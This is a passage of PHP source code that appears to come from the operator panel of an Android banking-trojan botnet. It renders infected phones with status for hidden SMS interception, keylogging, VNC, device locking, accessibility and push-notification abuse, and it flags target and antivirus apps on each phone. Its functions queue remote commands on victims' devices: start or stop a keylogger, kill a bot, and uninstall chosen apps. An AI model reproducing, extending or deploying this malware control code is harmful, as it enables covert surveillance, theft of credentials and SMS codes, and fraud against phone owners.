			return "<span class='fold_list_title' onclick='$(\"#fold_1_{$bot_id}\").toggle()'>Desired apps ({$apps_n})</span><br /><span id='fold_1_{$bot_id}' class='foldedList blackOL'><ul><li>" . implode("</li><li>", $apps) . "</li></ul></span>";

	}
	
	function get_desired_apps($bot_id, $installed_apps)
	{
		$installed_apps .= "|";
		
		$desired_apps = $this->db->fetch("select value from config where name='desired_apps'", true)[0]['value'];
		if($desired_apps == "") return array();
		
		//$desired_apps = strtolower($desired_apps);
		
		$desired_list = explode("\n", $desired_apps);
		$desired_list = array_filter($desired_list);
		$desired_list = array_unique($desired_list);

		$apps_n = 0;
		$apps = array();
		foreach($desired_list as $d)
			if(strstr($installed_apps, $d."|"))
			{
				$apps[] = $d;
				$apps_n++;
			}
		
		if($apps_n == 0)
			return array();
		else
			return $apps;
	}

	function make_bot_info_block($bot, $bot_row_html)
	{
		$bot_id = $bot['bot_id'];
		$tag = $bot['tag'];

		$is_dev_admin = ($bot['is_device_admin'])? 
			"<span style='color: #397EDF'><i title='Device admin enabled' class='flaticon-user-shape' style='color: #397EDF; margin: 0'></i></span>" :
			"<span style='color: grey'><i title='Device admin disabled' class='flaticon-user-shape' style='color: grey; margin: 0'></i></span>";
	
		$is_sms_admin = ($bot['is_sms_admin'])? 
			"<span style='color: green'><i title='Hidden SMS intercept enabled' class='flaticon-envelope-of-white-paper' style='color: #00ff00; margin: 0'></i></span>" :
			"<span style='color: grey'><i title='Hidden SMS intercept disabled' class='flaticon-envelope-of-white-paper' style='color: grey; margin: 0'></i></span>";
		
		$is_locked = ($bot['is_locked'])? 
			"<span style='color: darkred'><i title='Device is locked' class='flaticon-vintage-key-outline' style='color: red; margin: 0'></i></span>" : 
			"<span style='color: grey'><i title='Device is not locked' class='flaticon-vintage-key-outline' style='color: grey; margin: 0'></i></span>";

		$is_ldr = $bot['is_loader_installed'];
		
		if($is_ldr == 0)
			$is_loader_installed = "<span style='color: darkred'><i title='Loader uninstalled' class='flaticon-download-to-storage-drive' style='color: darkred; margin: 0'></i></span>";
		else if($is_ldr == 1)
			$is_loader_installed = "<span style='color: green'><i title='Loader is OK' class='flaticon-download-to-storage-drive' style='color: green; margin: 0'></i></span>";
		else if($is_ldr == 2)
			$is_loader_installed = "<span style='color: grey'><i title='No loader' class='flaticon-download-to-storage-drive' style='color: grey; margin: 0'></i></span>";

		$has_desired = $this->has_desired_apps($bot_id, $bot['apps']);
		
		$av_apps = $this->has_av_apps($bot_id, $bot['apps']);
	
		$res = $this->db->fetch("select count(id) from sms where bot_id='{$bot_id}'", true);
		$sms_sz = $res[0]['count(id)'];
		
		$last_seen_marker = get_last_seen_marker($bot['last_seen']);

		$res = $this->db->fetch("select count(id) from smarts_data where bot_id='{$bot_id}'", true);
		$smarts_data_sz = $res[0]['count(id)'];
	
		$res = $this->db->fetch("select count(*) from sms where bot_id='{$bot_id}'", true);
		$sms_sz = $res[0]['count(*)'];

		$ago = last_seen_time($bot['last_seen']);

		$uptime = time_readable($bot['uptime']);
		
		# COUNTRY FLAG
		$country_flag_path = "rc/flags/". strtoupper($bot['country']) . ".png";
		if(!file_exists($country_flag_path))
		{
			$country_flag_path = "rc/flags/_unknown.png";
		}
		$bot_row_html = str_replace("%COUNTRY_FLAG_PATH%", $country_flag_path, $bot_row_html);
		
		# LANG FLAG
		$lang_flag_path = "rc/flags/". strtoupper($bot['lang']) . ".png";
		if(!file_exists($lang_flag_path))
		{
			$lang_flag_path = "rc/flags/_unknown.png";
		}
		$bot_row_html = str_replace("%LANG_FLAG_PATH%", $lang_flag_path, $bot_row_html);
		
		foreach($bot as $elem=>$val)
			$bot_row_html = str_replace("%BOT_".strtoupper($elem)."%", $val, $bot_row_html);

		$vnc = VNC::formatStatus($bot_id, $bot['vnc']);
		$comment = str_replace('"', "'", $bot['comment']);
		
		//$lock_cmd = ($bot['is_locked'])? "Unlock" : "Lock";
		$sms_intercept = ($bot['is_sms_admin'])? "Stop SMS Intercept" : "Start SMS Intercept";
		
		$res = $this->db->fetch("select count(*) from bots_tasks where bot_id='{$bot_id}'", true);
		$count = $res[0]['count(*)'];
		
		$tasks_num = ($count > 0)? "{$count}" : "";
		
		$regdate = date('d/m/y H:i', strtotime($bot['registered']));
		
		$bot_id_short = "<input type='text' style='border: 0; width: 100%; font-family: monospace; font-size: 8pt' onclick='this.select()' value='{$bot_id}' />";
		
		
		$has_log = file_exists("../data/{$bot_id}.log");
		# disabled, no logs - grey
		if(!$bot['keylogger'] && !$has_log)
		{
			$keylogger_icon = '<i title="Keylogger disabled, no logs" class="flaticon-text-file" style="color: grey"></i>';
		
		# disabled, logs - darkblue link
		}else if(!$bot['keylogger'] && $has_log){
			
			$keylogger_icon = '<a title="Keylogger disabled, has logs" href="?a=admin&action=logs&bot_id='.$bot_id.'"><i title="Keylogger disabled, has logs" class="flaticon-text-file" style="color: darkblue"></i></a>';
		
		# enabled, no logs - grey
		}else if($bot['keylogger'] && !$has_log){
		
			$keylogger_icon = '<i title="Keylogger enabled, no logs yet" class="flaticon-text-file" style="color: grey"></i>';
			
		# enabled, logs - blue
		}else if($bot['keylogger'] && $has_log){
			
			$keylogger_icon = '<a title="Keylogger enabled, has logs" href="?a=admin&action=logs&bot_id='.$bot_id.'"><i title="Keylogger enabled, has logs" class="flaticon-text-file" style="color: blue"></i></a>';
			
		}
		
		if($bot['is_fg'])
		{
			$fg = "<i style='color: orange; margin: 0' class='flaticon-musical-bell-outline' title='Antisleep is enabled; Push is visible'></i>"; // in bots list
			$is_fg = "";
		}else{
			$fg = ""; // on bot's page
			$is_fg = " style='display: none' ";
		}
		
		$extra_info = [];
		$screen_state = "";
		try{
			// {"HAS_ACSB":1,"PUSH_ADMIN":1,"BATTERY_LEVEL":99,"ON_CHARGER":1,"SCREEN_UNLOCKED":0}
			$arr = json_decode($bot['extra_info_json'], true);

			if(isset($arr['SCREEN_UNLOCKED']) && $arr['SCREEN_UNLOCKED'])
				$screen_state = '<i title="Screen is unlocked" class="flaticon-mobile-phone" style="color: lime; margin: 0"></i> ';
			else
				$screen_state = '<i title="Screen is locked" class="flaticon-mobile-phone" style="color: grey; margin: 0"></i> ';

			if(!isset($arr['HAS_ACSB']))
				$arr['HAS_ACSB'] = 0;

			if($arr['HAS_ACSB'] == 2)
				$a = '<span title="Accessibility service stopped by system"><img src="rc/acsb_bad.png" alt="ACSB ON" width="15" /></span> ';
			else if($arr['HAS_ACSB'] == 1)
				$a = '<span title="Accessibility service enabled"><img src="rc/acsb_on.png" alt="ACSB ON" width="15" /></span> ';
			else
				$a = '<span title="Accessibility service disabled"><img src="rc/acsb_off.png" alt="ACSB OFF" width="15" /></span> ';

			$extra_info["HAS_ACSB"] = $a;

			if(isset($arr['PUSH_ADMIN']) && $arr['PUSH_ADMIN'])
				$extra_info["PUSH_ADMIN"] = '<img src="rc/push_on.png" width="18" alt="Push ON" title="Push intercept/block enabled" /> ';
			else
				$extra_info["PUSH_ADMIN"] = '<img src="rc/push_off.png" width="18" alt="Push OFF" title="Push intercept/block disabled" /> ';

			if(isset($arr['ON_CHARGER']) && $arr['ON_CHARGER']){
				$extra_info["ON_CHARGER"] = '<img src="rc/battery_on.png" width="18" alt="Charging.." title="Phone is on charger" /> ';
			}else{
				if(isset($arr['BATTERY_LEVEL']))
				{
					if($arr['BATTERY_LEVEL'] < 20)
						$extra_info["ON_CHARGER"] = '<img src="rc/battery_dead.png" width="18" alt="Battery" title="Battery level: '.$arr['BATTERY_LEVEL'].'%" /> ';
					else
						$extra_info["ON_CHARGER"] = '<img src="rc/battery.png" width="18" alt="Battery" title="Battery level: '.$arr['BATTERY_LEVEL'].'%" /> ';
				}else{
					$extra_info["ON_CHARGER"] = "";
				}
			}
			
			if(isset($arr['IS_ANDROID_GO']) && $arr['IS_ANDROID_GO'])
			{
				$is_go = '<img src="rc/ram.png" width="18" alt="Low Memory" title="Low memory - some functionality is limited" />';
			}else{
				$is_go = '';
			}

			// how many times bot was unable to open PermsAct
			// N times * 10m (delay between perms checks)
			$supressed = "";
			if(isset($arr['P_INFO_SUPRESSED']) && (int) $arr['P_INFO_SUPRESSED'] > 0)
			{
				$time = (int) $arr['P_INFO_SUPRESSED'];
				if($time > 3)
					$supressed = "<b title='Unable to get permissions (Suppressed {$time} times)' style='color: darkred'>Suppressed to background</b><br />";
			}

			$perms_failed = "";
			if(isset($arr['P_INFO_PERMS_FAILED']) && trim($arr['P_INFO_PERMS_FAILED']) != "")
			{
				$text = "Unable to get permissions: " . htmlspecialchars($arr['P_INFO_PERMS_FAILED']);
				
				$perms_failed = "<i title='{$text}' onclick='alert(\"{$text}\")' class='flaticon-warning-sign-on-a-triangular-background' style='color: red; margin: 0'></i>";
			}
			
			$local_time = "";
			if(isset($arr['P_LOCAL_TIMESTAMP']) && trim($arr['P_LOCAL_TIMESTAMP']) != "")
			{
				$local_time = date("M d, H:i", (int) $arr['P_LOCAL_TIMESTAMP']);
			}
			
			$current_task = "";
			if(isset($arr['P_TASK']))
			{
				$current_task = trim($arr['P_TASK']);
			}
			
			foreach($extra_info as $key=>$val)
			{
				$bot_row_html = str_replace("%{$key}%", $val, $bot_row_html);
			}
			
		}catch(Exception $exc){
			//$extra_info = "<span style='color: darkred'>BAD_EXTRA</span>";
		}
		
		
		
		// ------------------------ bot_row.html
		
		
		$bot_row_html = str_replace("%IS_GO%", $is_go, $bot_row_html);
		$bot_row_html = str_replace("%IS_FG%", $is_fg, $bot_row_html);
		$bot_row_html = str_replace("%IS_DEVICE_ADMIN%", $is_dev_admin, $bot_row_html);
		$bot_row_html = str_replace("%IS_SMS_ADMIN%", $is_sms_admin, $bot_row_html);
		$bot_row_html = str_replace("%IS_DEVICE_LOCKED%", $is_locked, $bot_row_html);
		$bot_row_html = str_replace("%IS_LOADER_INSTALLED%", $is_loader_installed, $bot_row_html);
		$bot_row_html = str_replace("%KEYLOGGER_ICON%", $keylogger_icon, $bot_row_html);
		
		$bot_row_html = str_replace("%FG_STATE%", $fg, $bot_row_html);
		$bot_row_html = str_replace("%SCREEN_STATE%", $screen_state, $bot_row_html);
		//$bot_row_html = str_replace("%EXTRA_INFO%", $extra_info, $bot_row_html);
		
		$bot_row_html = str_replace("%LAST_SEEN_MARKER%", $last_seen_marker, $bot_row_html);
		$bot_row_html = str_replace("%LAST_SEEN_AGO%", $ago, $bot_row_html);
		$bot_row_html = str_replace("%UPTIME%", $uptime, $bot_row_html);
		
		$bot_row_html = str_replace("%SMARTS_SZ_HIDE%", ($smarts_data_sz == 0)? "hidden" : "", $bot_row_html);
		$bot_row_html = str_replace("%SMARTS_DATA_SZ%", $smarts_data_sz, $bot_row_html);
		
		$bot_row_html = str_replace("%SMS_SZ_HIDE%", ($sms_sz == 0)? "hidden" : "", $bot_row_html);
		$bot_row_html = str_replace("%SMS_SZ%", $sms_sz, $bot_row_html);
		
		$bot_row_html = str_replace("%COMMENT%", $comment, $bot_row_html);
		$bot_row_html = str_replace("%REG_DATE%", $regdate, $bot_row_html);
		$bot_row_html = str_replace("%BOT_ID_FULL%", $bot_id_short, $bot_row_html);
		
		$bot_row_html = str_replace("%TARGET_APPS%", $has_desired, $bot_row_html);
		$bot_row_html = str_replace("%AV_APPS%", $av_apps, $bot_row_html);
		//$bot_row_html = str_replace("%LOCK_UNLOCK%", $lock_cmd, $bot_row_html);
		$bot_row_html = str_replace("%SMS_INTERCEPT%", $sms_intercept, $bot_row_html);
		$bot_row_html = str_replace("%TASKS_NUM%", $tasks_num, $bot_row_html);
		
		//~ $bot_row_html = str_replace("%UNINSTALLED_APPS%", $this->get_uninstalled_apps($bot_id, $bot['apps']), $bot_row_html);
		$bot_row_html = str_replace("%UNINSTALLED_APPS%", 
			"<span id='uninstalled_apps_{$bot_id}'><a href='javascript:get_uninstalled_apps(\"{$bot_id}\")'
			title='Check keylog for messages about uninstallation'
			>Check uninstalled apps</a></span>", $bot_row_html);
		$bot_row_html = str_replace("%VNC%", $vnc, $bot_row_html);
		
		$bot_row_html = str_replace("%SUPRESSED%", $supressed, $bot_row_html);
		$bot_row_html = str_replace("%PERMS_FAILED%", $perms_failed, $bot_row_html);
		$bot_row_html = str_replace("%LOCAL_TIME%", $local_time, $bot_row_html);
		$bot_row_html = str_replace("%TASK%", $current_task, $bot_row_html);

		return $bot_row_html;
	}

	//~ // $existing_apps = "app1|app2|app3"
	function get_uninstalled_apps($bot_id)
	{
		$bot_id2 = $this->db->escape($bot_id);
		$sql = "select apps from bots where bot_id={$bot_id2};";
		
		$existing_apps = $this->db->fetch($sql, true)[0]['apps'];
		$existing_apps .= "|";
		
		$path = "../data/{$bot_id}.log";
		
		if(!file_exists($path)) return "";
			
		$apps = [];
		
		$rows = file($path);

		$intent = "";      // com.pkg.name
		if(sizeof($rows))
		foreach($rows as $row)
		{
			$row = trim($row);
			// "UNINSTALL: intent to uninstall com.beforefigurev..."
			if(startsWith($row, "UNINSTALL: intent to uninstall "))
			{
				$ps = explode(" ", str_replace("...", "", $row));
				$tmp = array_pop($ps);
				if(trim($tmp) != "")
					$intent = $tmp;
			}
			
			if($intent != "" && 
				( startsWith($row, "UNINSTALL: confirmed") || strstr($row, "app is not installed: {$intent}") )
			)
			{
				if(strstr($existing_apps, $intent."|")) // app was uninstalled but installed again
					$apps[] = "<span style='color: blue; font-weight: bold' title='App was installed again'>{$intent}</span>";
				else
					$apps[] = $intent;
				$intent = "";
			}
		}

		$apps = array_unique($apps);
		$apps_n = sizeof($apps);
		
		if(!sizeof($apps)) return "";
		
		$html = "<span class='fold_list_title' onclick='$(\"#fold_3_{$bot_id}\").toggle()'>Uninstalled apps ({$apps_n})</span><br /><span id='fold_3_{$bot_id}' class='foldedList blackOL'><ul><li>" . implode("</li><li>", $apps) . "</li></ul></span>";
		return $html;
	}

	// One-click action
	function start_keylogger($ids, $data)
	{
		foreach($ids as $id)
		{
			$bot_id2 = $this->db->escape($id);
			$this->db->fetch("update bots set keylogger=1 where bot_id={$bot_id2}");
			$this->db->fetch("delete from bots_tasks where task_type in('start_keylogger', 'stop_keylogger') and bot_id={$bot_id2}");
			
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'start_keylogger', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		return $this->msg_ok("Keylogger enabled");
	}

	// One-click action
	function start_fg($ids, $data)
	{
		foreach($ids as $id)
		{
			$bot_id2 = $this->db->escape($id);
			$this->db->fetch("update bots set is_fg=1 where bot_id={$bot_id2}");
			$this->db->fetch("delete from bots_tasks where task_type in('start_fg', 'stop_fg') and bot_id={$bot_id2}");
			
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'start_fg', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		return $this->msg_ok("Antisleep enabled");
	}

	// One-click action
	function stop_fg($ids, $data)
	{
		foreach($ids as $id)
		{
			$bot_id2 = $this->db->escape($id);
			$this->db->fetch("update bots set is_fg=0 where bot_id={$bot_id2}");
			$this->db->fetch("delete from bots_tasks where task_type in('start_fg', 'stop_fg') and bot_id={$bot_id2}");
			
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'stop_fg', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		return $this->msg_ok("Antisleep disabled");
	}
	
	// One-click action
	function stop_vnc($ids, $data)
	{
		$bot_id2 = $this->db->escape($ids[0]);
		
		$this->db->fetch("delete from bots_tasks where task_type in('vnc_stop', 'vnc_start') and bot_id={$bot_id2}");
		
		$sql = "insert into bots_tasks values(null, {$bot_id2}, 'vnc_stop', 'true', 'waiting')";
		$this->db->fetch($sql);
		return $this->msg_ok("VNC stopped");
	}

	// One-click action
	function stop_keylogger($ids, $data)
	{
		foreach($ids as $id)
		{
			$bot_id2 = $this->db->escape($id);
			$this->db->fetch("update bots set keylogger=0 where bot_id={$bot_id2}");
			$this->db->fetch("delete from bots_tasks where task_type in('start_keylogger', 'stop_keylogger') and bot_id={$bot_id2}");
			
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'stop_keylogger', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		return $this->msg_ok("Keylogger disabled");
	}

	// One-click action
	function delete_olds($data)
	{
		$days = (int) $data['days'];
		if($days < 1)
		{
			return msg_err("Wrong amount of days");
		}
		
		$sql = "SELECT bot_id FROM `bots` WHERE last_seen < NOW() - INTERVAL {$days} DAY";
		
		if($this->delete_bots($sql, isset($data['with_logs'])))
			return msg_ok("Bots older than {$days} days were deleted");
		else
			return msg_err("Error bots deleting");
	}
	
	// One-click action
	function kill_bot($ids, $data)
	{
		foreach($ids as $id)
		{
			$bot_id2 = $this->db->escape($id);
			
			$this->db->fetch("delete from bots_tasks where task_type in('kill_bot') and bot_id={$bot_id2}");
			
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'kill_bot', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		return $this->msg_ok("Kill command sent");
	}

	// form action
	function uninstall_apps($data)
	{
		$html = file_get_contents('tpls/command_form.html');
		$backButtonVis = "hidden";
		$singleVis = "hidden";
		$formButtsVis = "";
		
		$ids = $this->clean_ids($data['bbot_id']);
		$sz = sizeof($ids);
		
		if($sz == 1)
		{
			$title = "Uninstall Apps on Bot";
			$singleVis = "";
		}else{
			$title = "Uninstall Apps on <span style='color: #5bc0de'>{$sz}</span> bots";
		}
		
		if($_POST)
		{
			list($isSuccess, $content) = $this->uninstall_apps_POST($ids, $_POST['pkgs']);
			$backButtonVis = "";
			$formButtsVis = "hidden";
			
		}else{
			$content = "<p class='lightText'>Packages:<br />
			<textarea class='form-control' rows='5' name='pkgs' placeholder='com.pkg1
com.pkg2
...'></textarea></p>";
		}
		
		$html = str_replace("%ACTION%", "uninstall_apps", $html);
		$html = str_replace("%BOT_ID%", implode(",", $ids), $html);
		$html = str_replace("%TITLE%", $title, $html);
		$html = str_replace("%CONTENT%", $content, $html);
		$html = str_replace("%BACK_BUTTON_VIS%", $backButtonVis, $html);
		$html = str_replace("%SINGLE_BOT_VIS%", $singleVis, $html);
		$html = str_replace("%FORM_BUTTS_VIS%", $formButtsVis, $html);
		
		return $html;
	}

	function uninstall_apps_POST($ids, $pkgs_string)
	{
		$pkgs = package_list_to_array($pkgs_string);
		
		if(!sizeof($pkgs))
			return [false, $this->msg_err('Error: Apps list can not be empty', false)];

		$data = $this->db->escape(implode(",", $pkgs));

		foreach($ids as $id)
		{
			if(!trim($id)) continue;
			
			$bot_id = $this->db->escape($id);
			$sql = "insert into bots_tasks values(null, {$bot_id}, 'uninstall_apps', {$data}, 'waiting')";
			//var_dump($sql);
			$this->db->fetch($sql);
		}
		
		if(sizeof($ids) == 1)
			return [true, $this->msg_ok("Task added to the Bot Task list", true)];
		else
			return [true, $this->msg_ok(sizeof($ids) . " tasks added to the Bot Task list", true)];
	}

}
